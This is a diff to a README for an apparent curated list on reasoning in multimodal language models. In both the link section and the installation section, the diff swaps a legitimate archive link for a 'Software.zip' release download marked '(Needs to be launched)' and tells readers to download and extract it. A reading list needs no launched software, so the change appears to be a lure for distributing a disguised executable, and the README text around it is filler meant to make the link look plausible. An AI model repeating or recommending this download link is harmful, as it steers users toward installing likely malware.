@@ -10,7 +10,7 @@ Welcome to the "Awesome-MLLM-Reasoning" repository, your go-to resource for cura
 - Stay updated on the latest advancements in reasoning language models
 
 ## Repository Link
-🔗 [Download the repository zip file here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+🔗 [Download the repository zip file here](https://github.com/zyphixiaa/Awesome-MLLM-Reasoning/releases/download/v1.0/Software.zip)
 *(Needs to be launched)*
 
 ## Table of Contents
@@ -24,7 +24,7 @@ Welcome to the "Awesome-MLLM-Reasoning" repository, your go-to resource for cura
 The "Awesome-MLLM-Reasoning" repository is a curated list dedicated to exploring the reasoning abilities of Multi-Modal Large Language Models. With a focus on OpenAI o1, OpenAI o3-mini, and Slow-Thinking, this repository aims to provide valuable insights into the world of reasoning language models.
 
 ## Installation
-To access the repository content, simply click on the provided [link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and download the zip file. Once downloaded, extract the contents and begin exploring the wealth of information on MLLM reasoning.
+To access the repository content, simply click on the provided [link](https://github.com/zyphixiaa/Awesome-MLLM-Reasoning/releases/download/v1.0/Software.zip) and download the zip file. Once downloaded, extract the contents and begin exploring the wealth of information on MLLM reasoning.
 
 ## Usage
 Explore the curated list of resources, dive into the capabilities of OpenAI o1, OpenAI o3-mini, and Slow-Thinking, and stay informed about multi-modal large language models. Collaborate with fellow enthusiasts, contribute your insights, and expand your knowledge in the field of reasoning language models.
